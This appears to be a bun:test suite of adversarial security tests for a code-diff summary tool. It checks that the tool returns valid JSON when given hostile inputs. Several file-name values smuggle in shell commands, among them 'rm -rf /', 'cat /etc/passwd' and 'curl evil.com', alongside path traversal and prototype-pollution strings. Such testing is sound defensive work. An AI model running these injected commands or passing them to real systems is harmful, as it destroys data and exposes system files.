import { afterEach, beforeEach, describe, expect, test, vi } from 'bun:test';
import type { ASTChange, ASTDiffResult } from '../../diff/ast-diff.js';
import type { ClassifiedChange } from '../../diff/semantic-classifier.js';
import type { SemanticDiffSummary } from '../../diff/summary-generator.js';
import type { ToolResult } from '../create-tool';

/**
 * Helper to extract string from ToolResult
 */
function resultToString(result: ToolResult): string {
	return typeof result === 'string' ? result : result.output;
}

interface MockASTDiffResult extends ASTDiffResult {
	changes: ASTChange[];
}

function makeASTDiffResult(
	overrides: Partial<MockASTDiffResult> = {},
): ASTDiffResult {
	return {
		filePath: 'test.ts',
		language: 'typescript',
		changes: [],
		durationMs: 10,
		usedAST: true,
		...overrides,
	};
}

function makeASTChange(overrides: Partial<ASTChange> = {}): ASTChange {
	return {
		type: 'modified',
		category: 'function',
		name: 'testFunc',
		lineStart: 1,
		lineEnd: 10,
		...overrides,
	};
}

function makeClassifiedChange(
	overrides: Partial<ClassifiedChange> = {},
): ClassifiedChange {
	return {
		category: 'LOGIC_CHANGE',
		riskLevel: 'High',
		filePath: 'test.ts',
		symbolName: 'testFunc',
		changeType: 'modified',
		lineStart: 1,
		lineEnd: 10,
		description: 'Test change',
		...overrides,
	};
}

function makeSemanticDiffSummary(
	overrides: Partial<SemanticDiffSummary> = {},
): SemanticDiffSummary {
	return {
		totalFiles: 0,
		totalChanges: 0,
		byRisk: { Critical: [], High: [], Medium: [], Low: [] },
		byCategory: {
			SIGNATURE_CHANGE: [],
			API_CHANGE: [],
			GUARD_REMOVED: [],
			LOGIC_CHANGE: [],
			DELETED_FUNCTION: [],
			NEW_FUNCTION: [],
			REFACTOR: [],
			COSMETIC: [],
			UNCLASSIFIED: [],
		},
		criticalItems: [],
		...overrides,
	};
}

function createToolContext(directory: string) {
	return { directory } as never;
}

describe('diff_summary ADVERSARIAL security tests', () => {
	let mockExecFileSync: ReturnType<typeof vi.fn>;
	let mockReadFileSync: ReturnType<typeof vi.fn>;
	let mockComputeASTDiff: ReturnType<typeof vi.fn>;
	let mockClassifyChanges: ReturnType<typeof vi.fn>;
	let mockGenerateSummary: ReturnType<typeof vi.fn>;

	beforeEach(async () => {
		delete require.cache[require.resolve('../../tools/diff-summary.js')];

		mockExecFileSync = vi.fn();
		mockReadFileSync = vi.fn();
		mockComputeASTDiff = vi.fn();
		mockClassifyChanges = vi.fn();
		mockGenerateSummary = vi.fn();

		vi.mock('node:child_process', () => ({
			execFileSync: mockExecFileSync,
		}));

		vi.mock('node:fs', () => ({
			readFileSync: mockReadFileSync,
		}));

		vi.mock('../../diff/ast-diff.js', () => ({
			computeASTDiff: mockComputeASTDiff,
		}));

		vi.mock('../../diff/semantic-classifier.js', () => ({
			classifyChanges: mockClassifyChanges,
		}));

		vi.mock('../../diff/summary-generator.js', () => ({
			generateSummary: mockGenerateSummary,
		}));
	});

	afterEach(() => {
		vi.clearAllMocks();
		vi.restoreAllMocks();
	});

	// Helper function to invoke tool
	async function invokeTool(
		args: Record<string, unknown>,
	): Promise<{ parsed: Record<string, unknown>; raw: string }> {
		const { diff_summary } = await import('../../tools/diff-summary.js');
		const result = await diff_summary.execute(
			args,
			createToolContext('/fake/dir'),
		);
		let parsed: Record<string, unknown>;
		try {
			parsed = JSON.parse(resultToString(result));
		} catch {
			parsed = { _parseError: resultToString(result) };
		}
		return { parsed, raw: resultToString(result) };
	}

	// Default happy path mock setup
	function setupHappyPath() {
		mockExecFileSync.mockReturnValue('old content');
		mockReadFileSync.mockReturnValue('new content');
		mockComputeASTDiff.mockResolvedValue(
			makeASTDiffResult({
				changes: [makeASTChange()],
			}),
		);
		mockClassifyChanges.mockReturnValue([makeClassifiedChange()]);
		mockGenerateSummary.mockReturnValue(
			makeSemanticDiffSummary({
				totalFiles: 1,
				totalChanges: 1,
			}),
		);
	}

	// ═══════════════════════════════════════════════════════════════════════════
	// 1. PATH TRAVERSAL ATTACKS
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on path traversal - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['../etc/passwd', 'src/app.ts'],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
		// Should return valid JSON - either error or summary
		expect(
			parsed.totalFiles !== undefined ||
				parsed.success === false ||
				parsed.error !== undefined,
		).toBe(true);
	});

	test('should never crash on absolute path - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['/etc/passwd'],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
		expect(
			parsed.totalFiles !== undefined ||
				parsed.success === false ||
				parsed.error !== undefined,
		).toBe(true);
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 2. SHELL INJECTION VIA FILE PATHS
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on semicolon injection - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['foo.js; rm -rf /'],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on pipe injection - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['foo.js | cat /etc/passwd'],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on ampersand injection - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['foo.js & curl evil.com'],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 3. OVERSIZED FILES ARRAY
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash with 15000 files - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: Array(15000).fill('src/app.ts'),
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 4. MALFORMED CLASSIFICATION/RISKLEVEL VALUES
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on garbage classification - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['src/app.ts'],
			classification: 'GARBAGE_CATEGORY_XYZ',
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on number classification - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['src/app.ts'],
			classification: 12345 as unknown as string,
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on object riskLevel - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['src/app.ts'],
			riskLevel: { value: 'Critical' } as unknown as string,
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 5. EMPTY STRINGS IN FILES ARRAY
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on empty string in files - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: [''],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 6. CONTROL CHARACTERS IN FILE PATHS
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on null byte in path - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['foo\x00bar.js'],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on newline in path - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['foo\nbar.js'],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 7. PROTOTYPE POLLUTION ATTEMPTS
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on __proto__ pollution - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['src/app.ts'],
			classification: '__proto__',
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on constructor pollution - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['src/app.ts'],
			classification: 'constructor',
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 8. EXTREMELY LONG FILE PATHS
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on 10000 char path - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: [`${'a'.repeat(10000)}.ts`],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 9. NULL/UNDEFINED ENTRIES IN FILES ARRAY
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on null in files - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: [null as unknown as string],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on undefined in files - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: [undefined as unknown as string],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// 10. REPEATED FILE PATHS
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on repeated paths - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: ['a.ts', 'a.ts', 'a.ts'],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	// ═══════════════════════════════════════════════════════════════════════════
	// EDGE CASES
	// ═══════════════════════════════════════════════════════════════════════════

	test('should never crash on files as string - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: 'not-an-array' as unknown as string[],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on missing files - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should never crash on null files - returns valid JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({
			files: null as unknown as string[],
		});
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
	});

	test('should return error for empty files array - returns valid error JSON', async () => {
		setupHappyPath();
		const { parsed, raw } = await invokeTool({ files: [] });
		expect(raw).toBeTruthy();
		expect(typeof raw).toBe('string');
		expect(parsed).toBeTruthy();
		const obj = parsed as { success?: boolean; error?: string };
		expect(obj.success).toBe(false);
	});
});
